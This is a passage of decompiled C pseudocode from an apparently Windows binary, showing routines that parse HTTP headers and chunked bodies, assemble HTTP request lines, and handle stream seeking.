    if ( dword_4EEDA0 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
    {
      _Init_thread_header(&dword_4EEDA0);
      if ( dword_4EEDA0 == -1 )
      {
        LOBYTE(v75) = 3;
        dword_4E8010 = 0;
        dword_4E8014 = 15;
        LOBYTE(dword_4E8000) = 0;
        sub_41EF80((void **)&dword_4E8000, &unk_4CCC25, 0);
        atexit(sub_4B7600);
        LOBYTE(v75) = 2;
        _Init_thread_footer(&dword_4EEDA0);
      }
    }
    v24 = &dword_4E8000;
  }
  else
  {
    v24 = v17 + 10;
  }
  sub_419BE0(&v56[4], v24);
  v25 = (_DWORD *)sub_432070((int)v68, *(__int128 *)&v56[4], *(__int64 *)&v56[20]);
  v26 = sub_4232C0(v25, "chunked");
  sub_4199E0(v68);
  LOBYTE(v75) = 1;
  sub_4199E0(v71);
  if ( v26 )
  {
    do
    {
LABEL_63:
      *(int *)((char *)&v57[5] + *(_DWORD *)(v57[0] + 4)) = *(int *)((char *)&v57[5] + *(_DWORD *)(v57[0] + 4)) & 0xFFFFF1FF | 0x800;
      v36 = sub_4290C0(v57, v27, (int)&v61);
      *(_DWORD *)&v56[24] = 10;
      *(_DWORD *)&v56[20] = 0x7FFFFFFF;
      *(_DWORD *)&v56[16] = -1;
      if ( (v36[*(_DWORD *)(*(_DWORD *)v36 + 4) + 12] & 6) != 0 )
      {
        sub_42F760((int)v57, *(__int64 *)&v56[16], *(int *)&v56[24]);
        sub_430250(v62, (int)v57);
        goto LABEL_105;
      }
      sub_42F760((int)v57, *(__int64 *)&v56[16], *(int *)&v56[24]);
      BYTE1(v64) = 0;
      v65 = 0;
      LOWORD(v66) = 1;
      v37 = *(_DWORD *)(v57[0] + 4);
      v58 = 0;
      v63 = *(_DWORD ***)((char *)&v57[14] + v37);
      LOBYTE(v64) = v63 == 0;
    }
    while ( !v61 );
    while ( 1 )
    {
      if ( sub_429020((int)&v63, (int)&v65) )
        goto LABEL_63;
      v38 = v63;
      if ( (_BYTE)v64 )
      {
        LOBYTE(v40) = BYTE1(v64);
      }
      else
      {
        if ( !v63
          || ((v39 = (unsigned __int8 *)*v63[7]) == 0 || (int)*v63[11] <= 0
            ? (v40 = ((int (__thiscall *)(_DWORD **))(*v63)[6])(v63))
            : (v40 = *v39),
              v40 == -1) )
        {
          LOBYTE(v40) = BYTE1(v64);
          goto LABEL_75;
        }
        BYTE1(v64) = v40;
      }
      if ( v38 )
      {
        if ( *v38[7] && (v44 = v38[11], *v44 > 0) )
        {
          --*v44;
          v45 = v38[7];
          v46 = (unsigned __int8 *)(*v45)++;
          v47 = *v46;
        }
        else
        {
          v47 = ((int (__thiscall *)(_DWORD **))(*v38)[7])(v38);
        }
        if ( v47 != -1 )
        {
          LOBYTE(v64) = 0;
          goto LABEL_76;
        }
      }
LABEL_75:
      v63 = 0;
      LOBYTE(v64) = 1;
LABEL_76:
      v41 = v62 + 5;
      v27 = v62[10];
      v42 = v62[9];
      v60 = v27;
      if ( v42 >= v27 )
      {
        if ( v42 == 0x7FFFFFFF )
          sub_4257D0();
        v48 = (v42 + 1) | 0xF;
        if ( v48 <= 0x7FFFFFFF )
        {
          v67 = v27 >> 1;
          if ( v27 <= 0x7FFFFFFF - (v27 >> 1) )
          {
            if ( v48 < v27 + v67 )
              v48 = v27 + v67;
          }
          else
          {
            v48 = 0x7FFFFFFF;
          }
        }
        else
        {
          v48 = 0x7FFFFFFF;
        }
        v67 = v48;
        v49 = sub_41FC00(v48 + 1);
        v13 = v60 < 0x10;
        v41[4] = v42 + 1;
        v41[5] = v67;
        v59 = v49;
        v67 = (int)v49 + v42;
        *(_DWORD *)&v56[24] = v42;
        if ( v13 )
        {
          memmove(v49, v41, *(size_t *)&v56[24]);
          v53 = v67;
          *(_BYTE *)v67 = v40;
          *(_BYTE *)(v53 + 1) = 0;
          *v41 = (int)v59;
        }
        else
        {
          v50 = (void *)*v41;
          memmove(v49, v50, *(size_t *)&v56[24]);
          v51 = v67;
          v52 = v60 + 1;
          *(_BYTE *)v67 = v40;
          *(_BYTE *)(v51 + 1) = 0;
          if ( v52 >= 0x1000 )
          {
            v52 += 35;
            if ( (unsigned int)v50 - *((_DWORD *)v50 - 1) - 4 > 0x1F )
              goto LABEL_110;
            v50 = (void *)*((_DWORD *)v50 - 1);
          }
          *(_DWORD *)&v56[24] = v52;
          sub_46C87D(v50);
          v62[5] = (int)v59;
        }
      }
      else
      {
        v62[9] = v42 + 1;
        v43 = v41;
        if ( v27 >= 0x10 )
          v43 = (int *)*v41;
        *((_BYTE *)v43 + v42) = v40;
        *((_BYTE *)v43 + v42 + 1) = 0;
      }
      if ( ++v58 >= v61 )
        goto LABEL_63;
    }
  }
  LOWORD(v66) = 1;
  BYTE1(v61) = 0;
  v63 = 0;
  v28 = *(_DWORD ***)((char *)&v57[14] + *(_DWORD *)(v57[0] + 4));
  v64 = v66;
  LOBYTE(v61) = v28 == 0;
  v66 = v61;
  v65 = v28;
  while ( !sub_429020((int)&v65, (int)&v63) )
  {
    v29 = v65;
    if ( !(_BYTE)v66 )
    {
      if ( !v65
        || ((v30 = (unsigned __int8 *)*v65[7]) == 0 || (int)*v65[11] <= 0
          ? (v31 = ((int (__thiscall *)(_DWORD **))(*v65)[6])(v65))
          : (v31 = *v30),
            v31 == -1) )
      {
        v29 = 0;
        v65 = 0;
      }
      else
      {
        BYTE1(v66) = v31;
      }
    }
    sub_41ED20((void **)(this + 20), SBYTE1(v66));
    if ( !v29
      || (!*v29[7] || (v32 = v29[11], *v32 <= 0)
        ? (v35 = ((int (__thiscall *)(_DWORD **))(*v29)[7])(v29))
        : (--*v32, v33 = (unsigned __int8 **)v29[7], v34 = *v33, ++*v33, v35 = *v34),
          v35 == -1) )
    {
      v65 = 0;
      LOBYTE(v66) = 1;
    }
    else
    {
      LOBYTE(v66) = 0;
    }
  }
LABEL_105:
  if ( v74 >= 0x10 )
  {
    v54 = (void *)v72[0];
    v55 = v74 + 1;
    if ( v74 + 1 >= 0x1000 )
    {
      v54 = *(void **)(v72[0] - 4);
      v55 = v74 + 36;
      if ( (unsigned int)(v72[0] - (_DWORD)v54 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    *(_DWORD *)&v56[24] = v55;
    sub_46C87D(v54);
  }
  sub_42AF20(v57);
}
// 42FC0A: variable 'v4' is possibly undefined
// 42FEEC: variable 'v27' is possibly undefined
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C388: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 46C3D2: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 4E8000: using guessed type int dword_4E8000;
// 4E8010: using guessed type int dword_4E8010;
// 4E8014: using guessed type int dword_4E8014;
// 4EEDA0: using guessed type int dword_4EEDA0;
// 4F0864: using guessed type int TlsIndex;
// 42FA90: using guessed type _DWORD var_70[6];

//----- (00430250) --------------------------------------------------------
void __thiscall sub_430250(int *this, int a2)
{
  _BYTE *v2; // edi
  int v3; // esi
  char *v4; // eax
  void (__thiscall ***v5)(_DWORD, int); // eax
  _BYTE *v6; // eax
  void **v7; // edi
  _BYTE *v8; // esi
  bool v9; // cf
  unsigned __int8 v10; // al
  int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // edx
  unsigned int v14; // esi
  size_t v15; // ecx
  void **v16; // eax
  unsigned int v17; // esi
  size_t v18; // ecx
  void **v19; // eax
  void **v20; // eax
  size_t v21; // edx
  void **v22; // eax
  void **v23; // ecx
  int *v24; // eax
  int v25; // esi
  size_t v26; // eax
  void *v27; // eax
  _DWORD *v28; // ecx
  int *v29; // edi
  int *v30; // esi
  int v31; // edx
  int v32; // ecx
  _DWORD *v33; // eax
  void *v34; // edx
  __int128 v35; // xmm0
  int *v36; // ecx
  void **v37; // eax
  void *v38; // ecx
  void *v39; // ecx
  _BYTE *v40; // edx
  void *v41; // ecx
  __int128 v42; // [esp-20h] [ebp-CCh]
  char v43[4]; // [esp+Ch] [ebp-A0h] BYREF
  int v44; // [esp+10h] [ebp-9Ch]
  int *v45; // [esp+14h] [ebp-98h]
  int v46; // [esp+18h] [ebp-94h]
  unsigned int v47; // [esp+1Ch] [ebp-90h]
  int *v48; // [esp+20h] [ebp-8Ch] BYREF
  int v49; // [esp+24h] [ebp-88h]
  _BYTE *v50; // [esp+28h] [ebp-84h]
  void *Src; // [esp+2Ch] [ebp-80h]
  _BYTE *v52; // [esp+30h] [ebp-7Ch]
  unsigned int v53; // [esp+34h] [ebp-78h]
  int *v54; // [esp+38h] [ebp-74h]
  int v55[5]; // [esp+3Ch] [ebp-70h] BYREF
  unsigned int v56; // [esp+50h] [ebp-5Ch]
  void *v57[4]; // [esp+54h] [ebp-58h] BYREF
  unsigned int v58; // [esp+64h] [ebp-48h]
  unsigned int v59; // [esp+68h] [ebp-44h]
  void *Buf[4]; // [esp+6Ch] [ebp-40h] BYREF
  unsigned int v61; // [esp+7Ch] [ebp-30h]
  unsigned int v62; // [esp+80h] [ebp-2Ch]
  void *v63[4]; // [esp+84h] [ebp-28h] BYREF
  size_t v64; // [esp+94h] [ebp-18h]
  unsigned int v65; // [esp+98h] [ebp-14h]
  int v66; // [esp+A8h] [ebp-4h]
  int savedregs; // [esp+ACh] [ebp+0h] BYREF

  v54 = this;
  v2 = (_BYTE *)a2;
  v52 = (_BYTE *)a2;
  v61 = 0;
  v62 = 15;
  LOBYTE(Buf[0]) = 0;
  v66 = 0;
  while ( 1 )
  {
    v44 = *(_DWORD *)(*(_DWORD *)&v2[*(_DWORD *)(*(_DWORD *)v2 + 4) + 48] + 4);
    v3 = v44;
    (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
    LOBYTE(v66) = 1;
    v4 = sub_421800((int)&savedregs, (int)v43);
    LOBYTE(v49) = (*(int (__thiscall **)(char *, int))(*(_DWORD *)v4 + 32))(v4, 10);
    LOBYTE(v66) = 0;
    if ( v3 )
    {
      v5 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
      if ( v5 )
        (**v5)(v5, 1);
    }
    v6 = sub_42A040(v2, (int)Buf, v49);
    if ( (v6[*(_DWORD *)(*(_DWORD *)v6 + 4) + 12] & 6) != 0 || v61 <= 2 )
      break;
    v7 = Buf;
    if ( v62 >= 0x10 )
      v7 = (void **)Buf[0];
    v53 = (unsigned int)v7 + v61 - 1;
    v8 = memchr(v7, 58, v61 - 1);
    if ( v8 )
    {
      while ( 1 )
      {
        v9 = *v8 < 0x3Au;
        if ( *v8 == 58 && (v10 = v8[1], v9 = v10 < 0x20u, v10 == 32) )
          v11 = 0;
        else
          v11 = v9 ? -1 : 1;
        if ( !v11 )
          break;
        v8 = memchr(v8 + 1, 58, v53 - (_DWORD)(v8 + 1));
        if ( !v8 )
          goto LABEL_16;
      }
      v12 = v61;
      v14 = v8 - (_BYTE *)v7;
      v13 = v62;
    }
    else
    {
LABEL_16:
      v12 = v61;
      v13 = v62;
      v14 = -1;
    }
    v2 = v52;
    if ( v14 != -1 )
    {
      v58 = 0;
      v15 = v14;
      v59 = 15;
      if ( v12 < v14 )
        v15 = v12;
      LOBYTE(v57[0]) = 0;
      v16 = Buf;
      if ( v13 >= 0x10 )
        v16 = (void **)Buf[0];
      sub_41EF80(v57, v16, v15);
      v17 = v14 + 2;
      LOBYTE(v66) = 2;
      v64 = 0;
      v65 = 15;
      LOBYTE(v63[0]) = 0;
      if ( v61 < v17 )
LABEL_77:
        sub_421040();
      v18 = -1;
      if ( v61 - v17 != -1 )
        v18 = v61 - v17;
      v19 = Buf;
      if ( v62 >= 0x10 )
        v19 = (void **)Buf[0];
      sub_41EF80(v63, (char *)v19 + v17, v18);
      LOBYTE(v66) = 3;
      if ( v64 )
      {
        v20 = v63;
        if ( v65 >= 0x10 )
          v20 = (void **)v63[0];
        if ( *((_BYTE *)v20 + v64 - 1) == 13 )
        {
          v21 = v64 - 1;
          if ( v64 < v64 - 1 )
            goto LABEL_77;
          --v64;
          v22 = v63;
          if ( v65 >= 0x10 )
            v22 = (void **)v63[0];
          *((_BYTE *)v22 + v21) = 0;
        }
      }
      v23 = v57;
      v47 = v59;
      if ( v59 >= 0x10 )
        v23 = (void **)v57[0];
      v50 = v57[0];
      Src = v23;
      v53 = v58;
      if ( v58 >= 0x10 )
      {
        v25 = v58 | 0xF;
        if ( (v58 | 0xF) > 0x7FFFFFFF )
          v25 = 0x7FFFFFFF;
        if ( (unsigned int)(v25 + 1) < 0x1000 )
        {
          v28 = operator new(v25 + 1);
        }
        else
        {
          v26 = v25 + 36;
          if ( v25 + 36 <= (unsigned int)(v25 + 1) )
            v26 = -1;
          v27 = operator new(v26);
          if ( !v27 )
            goto LABEL_78;
          v28 = (_DWORD *)(((unsigned int)v27 + 35) & 0xFFFFFFE0);
          *(v28 - 1) = v27;
        }
        LODWORD(v42) = v28;
        memmove(v28, Src, v53 + 1);
        v24 = (int *)sub_432070((int)v55, v42, __SPAIR64__(v25, v53));
      }
      else
      {
        v24 = (int *)sub_432070((int)v55, *(_OWORD *)v23, v53 | 0xF00000000i64);
      }
      v29 = v24;
      LOBYTE(v66) = 4;
      v30 = sub_429F50(v54, v24);
      Src = (void *)*v54;
      if ( v30 == Src )
        goto LABEL_55;
      v31 = (int)(v30 + 4);
      if ( (unsigned int)v30[9] >= 0x10 )
        v31 = v30[4];
      v32 = (int)v29;
      if ( (unsigned int)v29[5] >= 0x10 )
        v32 = *v29;
      if ( sub_429FB0(v32, v29[4], v31, v30[8]) < 0 )
      {
LABEL_55:
        v45 = v54;
        LOBYTE(v66) = 5;
        v46 = 0;
        v33 = operator new(0x40u);
        v34 = Src;
        v33[8] = 0;
        v33[9] = 0;
        v35 = *(_OWORD *)v29;
        v46 = 0;
        *((_OWORD *)v33 + 1) = v35;
        *((_QWORD *)v33 + 4) = *((_QWORD *)v29 + 2);
        v29[4] = 0;
        v29[5] = 15;
        *(_BYTE *)v29 = 0;
        v33[14] = 0;
        v33[15] = 15;
        *((_BYTE *)v33 + 40) = 0;
        v36 = v54;
        *v33 = v34;
        v33[1] = v34;
        v33[2] = v34;
        *((_WORD *)v33 + 6) = 0;
        LOBYTE(v66) = 4;
        sub_429B40(v36, &v48, v30, v33 + 4, v33);
        v30 = v48;
      }
      v37 = v63;
      if ( v30 + 10 != (int *)v63 )
      {
        if ( v65 >= 0x10 )
          v37 = (void **)v63[0];
        sub_41EF80((void **)v30 + 10, v37, v64);
      }
      LOBYTE(v66) = 3;
      if ( v56 >= 0x10 )
      {
        v38 = (void *)v55[0];
        if ( v56 + 1 >= 0x1000 )
        {
          v38 = *(void **)(v55[0] - 4);
          if ( (unsigned int)(v55[0] - (_DWORD)v38 - 4) > 0x1F )
            goto LABEL_78;
        }
        sub_46C87D(v38);
      }
      LOBYTE(v66) = 2;
      if ( v65 >= 0x10 )
      {
        v39 = v63[0];
        if ( v65 + 1 >= 0x1000 )
        {
          v39 = (void *)*((_DWORD *)v63[0] - 1);
          if ( (unsigned int)(v63[0] - v39 - 4) > 0x1F )
            goto LABEL_78;
        }
        sub_46C87D(v39);
      }
      v2 = v52;
      v64 = 0;
      v65 = 15;
      LOBYTE(v63[0]) = 0;
      LOBYTE(v66) = 0;
      if ( v47 >= 0x10 )
      {
        v40 = v50;
        if ( v47 + 1 >= 0x1000 )
        {
          v40 = (_BYTE *)*((_DWORD *)v50 - 1);
          if ( (unsigned int)(v50 - v40 - 4) > 0x1F )
            goto LABEL_78;
        }
        sub_46C87D(v40);
      }
    }
  }
  if ( v62 >= 0x10 )
  {
    v41 = Buf[0];
    if ( v62 + 1 >= 0x1000 )
    {
      v41 = (void *)*((_DWORD *)Buf[0] - 1);
      if ( (unsigned int)(Buf[0] - v41 - 4) > 0x1F )
LABEL_78:
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v41);
  }
}
// 430339: conditional instruction was optimized away because %var_30.4>=3u
// 4304ED: conditional instruction was optimized away because esi.4>=F
// 43051E: variable 'v42' is possibly undefined
// 421040: using guessed type void __noreturn sub_421040(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 430250: using guessed type char var_A0[4];

//----- (00430750) --------------------------------------------------------
int __thiscall sub_430750(int this, int a2)
{
  unsigned int v2; // esi
  int v3; // edx

  v2 = **(_DWORD **)(this + 28);
  if ( !v2 )
    return -1;
  if ( v2 <= **(_DWORD **)(this + 12) )
    return -1;
  v3 = a2;
  if ( a2 != -1 && (_BYTE)a2 != *(_BYTE *)(v2 - 1) && (*(_BYTE *)(this + 60) & 2) != 0 )
    return -1;
  ++**(_DWORD **)(this + 44);
  --**(_DWORD **)(this + 28);
  if ( a2 == -1 )
    return 0;
  ***(_BYTE ***)(this + 28) = a2;
  return v3;
}

//----- (004307B0) --------------------------------------------------------
int __thiscall sub_4307B0(_DWORD ***this, int a2)
{
  int v3; // edi
  _DWORD **v4; // eax
  void **v5; // eax
  int *v6; // eax
  _DWORD *v7; // esi
  int *v8; // eax
  int *v9; // eax
  int *v10; // eax
  int *v11; // eax
  int *v12; // eax
  int *v13; // eax
  _DWORD *v14; // esi
  _DWORD *v15; // eax
  int *v16; // eax
  _DWORD *v17; // edi
  int *v18; // eax
  int *v19; // eax
  int **v20; // eax
  int i; // eax
  int *j; // ecx
  _DWORD *v23; // eax
  void *v24; // ecx
  int v26; // [esp-10h] [ebp-ECh]
  int v27; // [esp-8h] [ebp-E4h]
  int v28; // [esp+Ch] [ebp-D0h]
  _DWORD *v29; // [esp+10h] [ebp-CCh] BYREF
  int v30[19]; // [esp+14h] [ebp-C8h] BYREF
  int v31[19]; // [esp+60h] [ebp-7Ch] BYREF
  int v32; // [esp+ACh] [ebp-30h]
  int v33; // [esp+B0h] [ebp-2Ch]
  void *v34[4]; // [esp+B4h] [ebp-28h] BYREF
  unsigned int v35; // [esp+C4h] [ebp-18h]
  unsigned int v36; // [esp+C8h] [ebp-14h]
  int v37; // [esp+D8h] [ebp-4h]

  v3 = a2;
  v32 = a2;
  v31[18] = a2;
  v29 = dword_4B8608;
  v37 = 0;
  v33 = 2;
  v31[0] = (int)&std::ostream::`vftable';
  v30[18] = 72;
  sub_421410((int)v31, (int)v30, 0);
  v37 = 2;
  *(int *)((char *)&v30[-1] + dword_4B8608[1]) = (int)&std::ostringstream::`vftable';
  *(int *)((char *)&v28 + v29[1]) = v29[1] - 80;
  sub_421380(v30);
  v30[0] = (int)&std::stringbuf::`vftable';
  v30[14] = 0;
  v30[15] = 4;
  v37 = 3;
  v35 = 0;
  v36 = 15;
  LOBYTE(v34[0]) = 0;
  v4 = this[2];
  LOBYTE(v37) = 4;
  switch ( (unsigned int)v4 )
  {
    case 0u:
      sub_41EF80(v34, &unk_4B8610, 3u);
      break;
    case 1u:
      sub_41EF80(v34, "POST", 4u);
      break;
    case 2u:
      sub_41EF80(v34, "HEAD", 4u);
      break;
    case 3u:
      sub_41EF80(v34, "PUT", 3u);
      break;
    case 4u:
      sub_41EF80(v34, "DELETE", 6u);
      break;
    default:
      break;
  }
  v5 = v34;
  if ( v36 >= 0x10 )
    v5 = (void **)v34[0];
  v6 = sub_426B10((int *)&v29, (int)v5, v35);
  v7 = this + 3;
  v8 = (int *)sub_422D50(v6, " ");
  if ( (unsigned int)this[8] >= 0x10 )
    v7 = (_DWORD *)*v7;
  v9 = sub_426B10(v8, (int)v7, (unsigned int)this[7]);
  sub_422D50(v9, " ");
  v27 = (int)this[10];
  v26 = (int)this[9];
  v10 = (int *)sub_422D50(&v29, "HTTP/");
  v11 = sub_42A9A0(v10, v26);
  v12 = (int *)sub_422D50(v11, ".");
  v13 = sub_42A9A0(v12, v27);
  sub_422D50(v13, "\r\n");
  v14 = **this;
  if ( v14 != *this )
  {
    do
    {
      v15 = v14 + 4;
      if ( v14[9] >= 0x10u )
        v15 = (_DWORD *)*v15;
      v16 = sub_426B10((int *)&v29, (int)v15, v14[8]);
      v17 = v14 + 10;
      v18 = (int *)sub_422D50(v16, ": ");
      if ( v14[15] >= 0x10u )
        v17 = (_DWORD *)*v17;
      v19 = sub_426B10(v18, (int)v17, v14[14]);
      sub_422D50(v19, "\r\n");
      v20 = (int **)v14[2];
      if ( *((_BYTE *)v20 + 13) )
      {
        for ( i = v14[1]; !*(_BYTE *)(i + 13); i = *(_DWORD *)(i + 4) )
        {
          if ( v14 != *(_DWORD **)(i + 8) )
            break;
          v14 = (_DWORD *)i;
        }
        v14 = (_DWORD *)i;
      }
      else
      {
        v14 = (_DWORD *)v14[2];
        for ( j = *v20; !*((_BYTE *)j + 13); j = (int *)*j )
          v14 = j;
      }
    }
    while ( v14 != *this );
    v3 = v32;
  }
  sub_422D50(&v29, "\r\n");
  v23 = this + 11;
  if ( (unsigned int)this[16] >= 0x10 )
    v23 = (_DWORD *)*v23;
  sub_426B10((int *)&v29, (int)v23, (unsigned int)this[15]);
  sub_431FB0((int)&v29, v3);
  if ( v36 >= 0x10 )
  {
    v24 = v34[0];
    if ( v36 + 1 >= 0x1000 )
    {
      v24 = (void *)*((_DWORD *)v34[0] - 1);
      if ( (unsigned int)(v34[0] - v24 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v24);
  }
  v35 = 0;
  v36 = 15;
  LOBYTE(v34[0]) = 0;
  sub_42AFB0(&v29);
  return v3;
}
// 4B857C: using guessed type void *std::ostream::`vftable';
// 4B85C4: using guessed type void *std::stringbuf::`vftable';
// 4B8604: using guessed type void *std::ostringstream::`vftable';
// 4B8608: using guessed type _DWORD dword_4B8608[2];

//----- (00430AE0) --------------------------------------------------------
_DWORD *__thiscall sub_430AE0(int this, _DWORD *a2, __int64 a3, int a4, char a5)
{
  int v6; // edi
  unsigned int v7; // ecx
  int v9; // edx
  unsigned int v10; // edi
  int v11; // eax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // kr00_8
  int v15; // eax
  int v16; // edx
  _DWORD *result; // eax
  int v18; // [esp+14h] [ebp-14h]
  int v19; // [esp+1Ch] [ebp-Ch]
  int v20; // [esp+20h] [ebp-8h]
  int v21; // [esp+24h] [ebp-4h]
  int v22; // [esp+3Ch] [ebp+14h]
  int v23; // [esp+40h] [ebp+18h]

  v6 = **(_DWORD **)(this + 28);
  v21 = v6;
  v7 = **(_DWORD **)(this + 32);
  if ( v7 && *(_DWORD *)(this + 56) < v7 )
    *(_DWORD *)(this + 56) = v7;
  v9 = **(_DWORD **)(this + 12);
  v18 = *(_DWORD *)(this + 56);
  v20 = v18 - v9;
  v19 = v9;
  if ( !a4 )
  {
    v11 = 0;
    v10 = 0;
    goto LABEL_18;
  }
  if ( a4 == 1 )
  {
    if ( (a5 & 3) != 3 )
    {
      if ( (a5 & 1) != 0 )
      {
        if ( v6 || !v9 )
        {
          v12 = v6 - v9;
          v10 = v12;
          v11 = HIDWORD(v12);
          goto LABEL_18;
        }
      }
      else if ( (a5 & 2) != 0 && (v7 || !v9) )
      {
        v13 = (int)(v7 - v9);
        v10 = v13;
        v11 = HIDWORD(v13);
        goto LABEL_18;
      }
    }
LABEL_31:
    result = a2;
    *a2 = -1;
    a2[1] = -1;
    goto LABEL_32;
  }
  if ( a4 != 2 )
    goto LABEL_31;
  v10 = v18 - v9;
  v11 = v20 >> 31;
LABEL_18:
  v14 = a3 + __PAIR64__(v11, v10);
  v22 = (a3 + __PAIR64__(v11, v10)) >> 32;
  if ( a3 + __PAIR64__(v11, v10) > v20 || v14 && ((a5 & 1) != 0 && !v21 || (a5 & 2) != 0 && !v7) )
    goto LABEL_31;
  v15 = v14 + v19;
  v23 = v14 + v19;
  if ( (a5 & 1) != 0 && v21 )
  {
    **(_DWORD **)(this + 28) = v15;
    **(_DWORD **)(this + 44) = v18 - v15;
  }
  if ( (a5 & 2) != 0 && v7 )
  {
    v16 = **(_DWORD **)(this + 32) + **(_DWORD **)(this + 48);
    **(_DWORD **)(this + 16) = v19;
    **(_DWORD **)(this + 32) = v23;
    **(_DWORD **)(this + 48) = v16 - v23;
  }
  result = a2;
  *a2 = v14;
  a2[1] = v22;
LABEL_32:
  result[2] = 0;
  result[3] = 0;
  *((_QWORD *)result + 2) = 0i64;
  return result;
}

//----- (00430C50) --------------------------------------------------------
_DWORD *__thiscall sub_430C50(int this, _DWORD *a2, __int64 a3, __int64 a4, int a5, int a6, char a7)
{
  unsigned __int64 v8; // kr00_8
  unsigned int v9; // ecx
  char v10; // dl
  int v11; // eax
  int v12; // edx
  _DWORD *result; // eax
  int v14; // [esp+10h] [ebp-10h]
  int v15; // [esp+18h] [ebp-8h]
  int v16; // [esp+1Ch] [ebp-4h]

  v8 = a3 + a4;
  v15 = **(_DWORD **)(this + 28);
  v9 = **(_DWORD **)(this + 32);
  if ( v9 && *(_DWORD *)(this + 56) < v9 )
    *(_DWORD *)(this + 56) = v9;
  v14 = *(_DWORD *)(this + 56);
  v16 = **(_DWORD **)(this + 12);
  if ( v8 > v14 - v16 || (v10 = a7, v8) && ((a7 & 1) != 0 && !v15 || (a7 & 2) != 0 && !v9) )
  {
    result = a2;
    *a2 = -1;
    a2[1] = -1;
  }
  else
  {
    v11 = v8 + v16;
    if ( (a7 & 1) != 0 && v15 )
    {
      **(_DWORD **)(this + 28) = v11;
      **(_DWORD **)(this + 44) = v14 - v11;
      v10 = a7;
    }
    if ( (v10 & 2) != 0 && v9 )
    {
      v12 = **(_DWORD **)(this + 48) + **(_DWORD **)(this + 32);
      **(_DWORD **)(this + 16) = v16;
      **(_DWORD **)(this + 32) = v8 + v16;
      **(_DWORD **)(this + 48) = v12 - (v8 + v16);
    }
    result = a2;
    *(_QWORD *)a2 = v8;
  }
  result[2] = 0;
  result[3] = 0;
  *((_QWORD *)result + 2) = 0i64;
  return result;
}

//----- (00430D40) --------------------------------------------------------
int __thiscall sub_430D40(size_t *this, int a2, _DWORD **a3, __int64 a4)
{
  int v4; // edi
  char v5; // bl
  _DWORD *v6; // esi
  _DWORD **v7; // esi
  _DWORD *v8; // eax
  _BYTE *v9; // edx
  _BYTE *v10; // ecx
  _DWORD *v11; // ecx
  int i; // eax
  bool v13; // al
  char v14; // al
  void *v15; // ecx
  void *v16; // ecx
  void *v17; // ecx
  bool v18; // al
  char v19; // al
  void *v20; // ecx
  void *v21; // ecx
  void *v22; // ecx
  bool v23; // al
  char v24; // al
  void *v25; // ecx
  size_t *v26; // esi
  void *v27; // ecx
  bool v28; // al
  char v29; // al
  void *v30; // ecx
  size_t *v31; // eax
  void *v32; // ecx
  void *v33; // ecx
  void *v34; // ecx
  void *v35; // ecx
  void *v36; // ecx
  void *v37; // ecx
  void *v38; // ecx
  void *v39; // ecx
  _DWORD *v40; // eax
  void **v41; // eax
  void **v42; // edi
  void **v43; // eax
  char *v44; // edi
  char *v45; // ecx
  void **v46; // eax
  unsigned int v47; // edi
  _DWORD **v50; // [esp+28h] [ebp-48Ch] BYREF
  char v51; // [esp+2Fh] [ebp-485h]
  _DWORD **v52; // [esp+30h] [ebp-484h] BYREF
  _DWORD *v53; // [esp+34h] [ebp-480h]
  _DWORD *v54; // [esp+38h] [ebp-47Ch]
  _DWORD v55[6]; // [esp+3Ch] [ebp-478h] BYREF
  int v56; // [esp+54h] [ebp-460h]
  _DWORD *v57; // [esp+58h] [ebp-45Ch]
  _DWORD v58[6]; // [esp+5Ch] [ebp-458h] BYREF
  void *v59[4]; // [esp+74h] [ebp-440h] BYREF
  int v60; // [esp+84h] [ebp-430h]
  unsigned int v61; // [esp+88h] [ebp-42Ch]
  void *v62[4]; // [esp+8Ch] [ebp-428h] BYREF
  unsigned int v63; // [esp+9Ch] [ebp-418h]
  unsigned int v64; // [esp+A0h] [ebp-414h]
  char v65[872]; // [esp+A4h] [ebp-410h] BYREF
  _DWORD *v66; // [esp+40Ch] [ebp-A8h] BYREF
  int v67[19]; // [esp+410h] [ebp-A4h] BYREF
  void **v68; // [esp+45Ch] [ebp-58h] BYREF
  int v69; // [esp+4B0h] [ebp-4h]

  v4 = a2;
  v5 = 0;
  v50 = a3;
  v69 = 0;
  v52 = 0;
  v53 = 0;
  v6 = operator new(0x40u);
  *v6 = v6;
  v6[1] = v6;
  v6[2] = v6;
  *((_WORD *)v6 + 6) = 257;
  v52 = (_DWORD **)v6;
  v69 = 1;
  v6[1] = sub_429420((int *)&v52, (int *)(*v50)[1], (int)v6, (int)&v52);
  v7 = v50;
  v53 = v50[1];
  v8 = v52;
  v50 = v52;
  v9 = v52[1];
  if ( v9[13] )
  {
    *v52 = v52;
    v52[2] = v52;
  }
  else
  {
    v10 = *(_BYTE **)v9;
    if ( !*(_BYTE *)(*(_DWORD *)v9 + 13) )
    {
      do
      {
        v9 = v10;
        v10 = *(_BYTE **)v10;
      }
      while ( !v10[13] );
      v8 = v50;
    }
    *v8 = v9;
    v11 = v52[1];
    for ( i = v11[2]; !*(_BYTE *)(i + 13); i = *(_DWORD *)(i + 8) )
      v11 = (_DWORD *)i;
    v52[2] = v11;
  }
  v54 = v7[2];
  v69 = 2;
  sub_419BE0(v55, v7 + 3);
  v56 = (int)v7[9];
  v57 = v7[10];
  LOBYTE(v69) = 3;
  sub_419BE0(v58, v7 + 11);
  v69 = 4;
  v60 = 0;
  v61 = 15;
  LOBYTE(v59[0]) = 0;
  sub_41EF80(v59, "From", 4u);
  LOBYTE(v69) = 5;
  v13 = sub_42F690((int *)&v52, v59);
  LOBYTE(v69) = 4;
  v14 = !v13;
  v51 = v14;
  if ( v61 >= 0x10 )
  {
    v15 = v59[0];
    if ( v61 + 1 >= 0x1000 )
    {
      v15 = (void *)*((_DWORD *)v59[0] - 1);
